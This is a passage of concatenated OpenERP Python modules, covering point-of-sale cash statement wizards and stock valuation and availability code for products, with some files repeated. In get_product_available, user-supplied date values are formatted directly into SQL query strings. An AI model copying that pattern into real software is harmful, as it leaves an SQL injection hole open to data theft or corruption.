    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import fields, osv
from tools.translate import _

class product_product(osv.osv):
    _inherit = "product.product"

    def get_product_accounts(self, cr, uid, product_id, context=None):
        """ To get the stock input account, stock output account and stock journal related to product.
        @param product_id: product id
        @return: dictionary which contains information regarding stock input account, stock output account and stock journal
        """
        if context is None:
            context = {}
        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)

        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False
        if not stock_input_acc:
            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False

        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False
        if not stock_output_acc:
            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False

        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False
        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False

        return {
            'stock_account_input': stock_input_acc,
            'stock_account_output': stock_output_acc,
            'stock_journal': journal_id,
            'property_stock_variation': account_variation
        }

    def do_change_standard_price(self, cr, uid, ids, datas, context={}):
        """ Changes the Standard Price of Product and creates an account move accordingly.
        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal
        @param context: A standard dictionary
        @return:

        """
        location_obj = self.pool.get('stock.location')
        move_obj = self.pool.get('account.move')
        move_line_obj = self.pool.get('account.move.line')

        new_price = datas.get('new_price', 0.0)
        stock_output_acc = datas.get('stock_output_account', False)
        stock_input_acc = datas.get('stock_input_account', False)
        journal_id = datas.get('stock_journal', False)
        product_obj=self.browse(cr,uid,ids)[0]
        account_variation = product_obj.categ_id.property_stock_variation
        account_variation_id = account_variation and account_variation.id or False
        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))
        move_ids = []
        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])
        for rec_id in ids:
            for location in location_obj.browse(cr, uid, loc_ids):
                c = context.copy()
                c.update({
                    'location': location.id,
                    'compute_child': False
                })

                product = self.browse(cr, uid, rec_id, context=c)
                qty = product.qty_available
                diff = product.standard_price - new_price
                if not diff: raise osv.except_osv(_('Error!'), _("Could not find any difference between standard price and new price!"))
                if qty:
                    company_id = location.company_id and location.company_id.id or False
                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))
                    #
                    # Accounting Entries
                    #
                    if not journal_id:
                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False
                    if not journal_id:
                        raise osv.except_osv(_('Error!'),
                            _('There is no journal defined '\
                                'on the product category: "%s" (id: %d)') % \
                                (product.categ_id.name,
                                    product.categ_id.id,))
                    move_id = move_obj.create(cr, uid, {
                                'journal_id': journal_id,
                                'company_id': company_id
                                })

                    move_ids.append(move_id)


                    if diff > 0:
                        if not stock_input_acc:
                            stock_input_acc = product.product_tmpl_id.\
                                property_stock_account_input.id
                        if not stock_input_acc:
                            stock_input_acc = product.categ_id.\
                                    property_stock_account_input_categ.id
                        if not stock_input_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock input account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * diff
                        move_line_obj.create(cr, uid, {
                                    'name': product.name,
                                    'account_id': stock_input_acc,
                                    'debit': amount_diff,
                                    'move_id': move_id,
                                    })
                        move_line_obj.create(cr, uid, {
                                    'name': product.categ_id.name,
                                    'account_id': account_variation_id,
                                    'credit': amount_diff,
                                    'move_id': move_id
                                    })
                    elif diff < 0:
                        if not stock_output_acc:
                            stock_output_acc = product.product_tmpl_id.\
                                property_stock_account_output.id
                        if not stock_output_acc:
                            stock_output_acc = product.categ_id.\
                                    property_stock_account_output_categ.id
                        if not stock_output_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock output account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * -diff
                        move_line_obj.create(cr, uid, {
                                        'name': product.name,
                                        'account_id': stock_output_acc,
                                        'credit': amount_diff,
                                        'move_id': move_id
                                    })
                        move_line_obj.create(cr, uid, {
                                        'name': product.categ_id.name,
                                        'account_id': account_variation_id,
                                        'debit': amount_diff,
                                        'move_id': move_id
                                    })

            self.write(cr, uid, rec_id, {'standard_price': new_price})

        return move_ids

    def view_header_get(self, cr, user, view_id, view_type, context=None):
        if context is None:
            context = {}
        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)
        if res: return res
        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):
            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name
        return res

    def get_product_available(self, cr, uid, ids, context=None):
        """ Finds whether product is available or not in particular warehouse.
        @return: Dictionary of values
        """
        if context is None:
            context = {}
        states = context.get('states',[])
        what = context.get('what',())
        if not ids:
            ids = self.search(cr, uid, [])
        res = {}.fromkeys(ids, 0.0)
        if not ids:
            return res

        if context.get('shop', False):
            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))
            res2 = cr.fetchone()
            if res2:
                context['warehouse'] = res2[0]

        if context.get('warehouse', False):
            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))
            res2 = cr.fetchone()
            if res2:
                context['location'] = res2[0]

        if context.get('location', False):
            if type(context['location']) == type(1):
                location_ids = [context['location']]
            elif type(context['location']) in (type(''), type(u'')):
                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)
            else:
                location_ids = context['location']
        else:
            location_ids = []
            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)
            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):
                location_ids.append(w.lot_stock_id.id)

        # build the list of ids of children of the location given by id
        if context.get('compute_child',True):
            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])
            location_ids = child_location_ids or location_ids
        else:
            location_ids = location_ids

        uoms_o = {}
        product2uom = {}
        for product in self.browse(cr, uid, ids, context=context):
            product2uom[product.id] = product.uom_id.id
            uoms_o[product.uom_id.id] = product.uom_id

        results = []
        results2 = []

        from_date=context.get('from_date',False)                    
        to_date=context.get('to_date',False)                    
        date_str=False                    
        if from_date and to_date:
            date_str="date_planned>='%s' and date_planned<='%s'"%(from_date,to_date)                    
        elif from_date:
            date_str="date_planned>='%s'"%(from_date)                    
        elif to_date:
            date_str="date_planned<='%s'"%(to_date)                    

        if 'in' in what:
            # all moves from a location out of the set to a location in the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id NOT IN %s'\
                'and location_dest_id IN %s'\
                'and product_id IN %s'\
                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results = cr.fetchall()
        if 'out' in what:
            # all moves from a location in the set to a location out of the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id IN %s'\
                'and location_dest_id NOT IN %s '\
                'and product_id  IN %s'\
                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results2 = cr.fetchall()
        uom_obj = self.pool.get('product.uom')
        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)
        if context.get('uom', False):
            uoms += [context['uom']]

        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)
        if uoms:
            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)
        for o in uoms:
            uoms_o[o.id] = o
        for amount, prod_id, prod_uom in results:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] += amount
        for amount, prod_id, prod_uom in results2:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] -= amount
        return res

    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):
        """ Finds the incoming and outgoing quantity of product.
        @return: Dictionary of values
        """
        if not field_names:
            field_names = []
        if context is None:
            context = {}
        res = {}
        for id in ids:
            res[id] = {}.fromkeys(field_names, 0.0)
        for f in field_names:
            c = context.copy()
            if f == 'qty_available':
                c.update({ 'states': ('done',), 'what': ('in', 'out') })
            if f == 'virtual_available':
                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })
            if f == 'incoming_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })
            if f == 'outgoing_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })
            stock = self.get_product_available(cr, uid, ids, context=c)
            for id in ids:
                res[id][f] = stock.get(id, 0.0)
        return res

    _columns = {
        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help="Current quantities of products in selected locations or all internal if none have been selected.", multi='qty_available'),
        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help="Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.", multi='qty_available'),
        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help="Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.", multi='qty_available'),
        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help="Quantities of products that are planned to leave in selected locations or all internal if none have been selected.", multi='qty_available'),
        'track_production': fields.boolean('Track Manufacturing Lots' , help="Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order"),
        'track_incoming': fields.boolean('Track Incoming Lots', help="Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location"),
        'track_outgoing': fields.boolean('Track Outgoing Lots', help="Forces to specify a Production Lot for all moves containing this product and going to a Customer Location"),
        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),
        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),
                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', 
                                        help="If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves." \
                                             "The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products."
                                        , required=True),
    }

    _defaults = {
        'valuation': lambda *a: 'manual_periodic',
    }

    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):
        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)
        if context is None:
            context = {}
        if ('location' in context) and context['location']:
            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])
            fields=res.get('fields',{})
            if fields:
                if location_info.usage == 'supplier':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Receptions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Received Qty')

                if location_info.usage == 'internal':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Stock')

                if location_info.usage == 'customer':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Deliveries')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Delivered Qty')

                if location_info.usage == 'inventory':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future P&L')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('P&L Qty')

                if location_info.usage == 'procurement':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Qty')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Unplanned Qty')

                if location_info.usage == 'production':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Productions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Produced Qty')
        return res

product_product()

class product_template(osv.osv):
    _name = 'product.template'
    _inherit = 'product.template'
    _columns = {
        'property_stock_procurement': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Procurement Location",
            method=True,
            view_load=True,
            domain=[('usage','like','procurement')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements"),
        'property_stock_production': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Production Location",
            method=True,
            view_load=True,
            domain=[('usage','like','production')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders"),
        'property_stock_inventory': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Inventory Location",
            method=True,
            view_load=True,
            domain=[('usage','like','inventory')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory"),
        'property_stock_account_input': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
        'property_stock_account_output': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
    }

product_template()

class product_category(osv.osv):

    _inherit = 'product.category'
    _columns = {
        'property_stock_journal': fields.property('account.journal',
            relation='account.journal', type='many2one',
            string='Stock journal', method=True, view_load=True,
            help="When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed."),
        'property_stock_account_input_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_account_output_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_variation': fields.property('account.account',
            type='many2one',
            relation='account.account',
            string="Stock Variation Account",
            method=True, view_load=True,
            help="When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.",),
    }

product_category()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import fields, osv
from tools.translate import _

class product_product(osv.osv):
    _inherit = "product.product"

    def get_product_accounts(self, cr, uid, product_id, context=None):
        """ To get the stock input account, stock output account and stock journal related to product.
        @param product_id: product id
        @return: dictionary which contains information regarding stock input account, stock output account and stock journal
        """
        if context is None:
            context = {}
        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)

        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False
        if not stock_input_acc:
            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False

        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False
        if not stock_output_acc:
            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False

        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False
        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False

        return {
            'stock_account_input': stock_input_acc,
            'stock_account_output': stock_output_acc,
            'stock_journal': journal_id,
            'property_stock_variation': account_variation
        }

    def do_change_standard_price(self, cr, uid, ids, datas, context={}):
        """ Changes the Standard Price of Product and creates an account move accordingly.
        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal
        @param context: A standard dictionary
        @return:

        """
        location_obj = self.pool.get('stock.location')
        move_obj = self.pool.get('account.move')
        move_line_obj = self.pool.get('account.move.line')

        new_price = datas.get('new_price', 0.0)
        stock_output_acc = datas.get('stock_output_account', False)
        stock_input_acc = datas.get('stock_input_account', False)
        journal_id = datas.get('stock_journal', False)
        product_obj=self.browse(cr,uid,ids)[0]
        account_variation = product_obj.categ_id.property_stock_variation
        account_variation_id = account_variation and account_variation.id or False
        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))
        move_ids = []
        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])
        for rec_id in ids:
            for location in location_obj.browse(cr, uid, loc_ids):
                c = context.copy()
                c.update({
                    'location': location.id,
                    'compute_child': False
                })

                product = self.browse(cr, uid, rec_id, context=c)
                qty = product.qty_available
                diff = product.standard_price - new_price
                if not diff: raise osv.except_osv(_('Error!'), _("Could not find any difference between standard price and new price!"))
                if qty:
                    company_id = location.company_id and location.company_id.id or False
                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))
                    #
                    # Accounting Entries
                    #
                    if not journal_id:
                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False
                    if not journal_id:
                        raise osv.except_osv(_('Error!'),
                            _('There is no journal defined '\
                                'on the product category: "%s" (id: %d)') % \
                                (product.categ_id.name,
                                    product.categ_id.id,))
                    move_id = move_obj.create(cr, uid, {
                                'journal_id': journal_id,
                                'company_id': company_id
                                })

                    move_ids.append(move_id)


                    if diff > 0:
                        if not stock_input_acc:
                            stock_input_acc = product.product_tmpl_id.\
                                property_stock_account_input.id
                        if not stock_input_acc:
                            stock_input_acc = product.categ_id.\
                                    property_stock_account_input_categ.id
                        if not stock_input_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock input account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * diff
                        move_line_obj.create(cr, uid, {
                                    'name': product.name,
                                    'account_id': stock_input_acc,
                                    'debit': amount_diff,
                                    'move_id': move_id,
                                    })
                        move_line_obj.create(cr, uid, {
                                    'name': product.categ_id.name,
                                    'account_id': account_variation_id,
                                    'credit': amount_diff,
                                    'move_id': move_id
                                    })
                    elif diff < 0:
                        if not stock_output_acc:
                            stock_output_acc = product.product_tmpl_id.\
                                property_stock_account_output.id
                        if not stock_output_acc:
                            stock_output_acc = product.categ_id.\
                                    property_stock_account_output_categ.id
                        if not stock_output_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock output account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * -diff
                        move_line_obj.create(cr, uid, {
                                        'name': product.name,
                                        'account_id': stock_output_acc,
                                        'credit': amount_diff,
                                        'move_id': move_id
                                    })
                        move_line_obj.create(cr, uid, {
                                        'name': product.categ_id.name,
                                        'account_id': account_variation_id,
                                        'debit': amount_diff,
                                        'move_id': move_id
                                    })

            self.write(cr, uid, rec_id, {'standard_price': new_price})

        return move_ids

    def view_header_get(self, cr, user, view_id, view_type, context=None):
        if context is None:
            context = {}
        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)
        if res: return res
        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):
            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name
        return res

    def get_product_available(self, cr, uid, ids, context=None):
        """ Finds whether product is available or not in particular warehouse.
        @return: Dictionary of values
        """
        if context is None:
            context = {}
        states = context.get('states',[])
        what = context.get('what',())
        if not ids:
            ids = self.search(cr, uid, [])
        res = {}.fromkeys(ids, 0.0)
        if not ids:
            return res

        if context.get('shop', False):
            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))
            res2 = cr.fetchone()
            if res2:
                context['warehouse'] = res2[0]

        if context.get('warehouse', False):
            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))
            res2 = cr.fetchone()
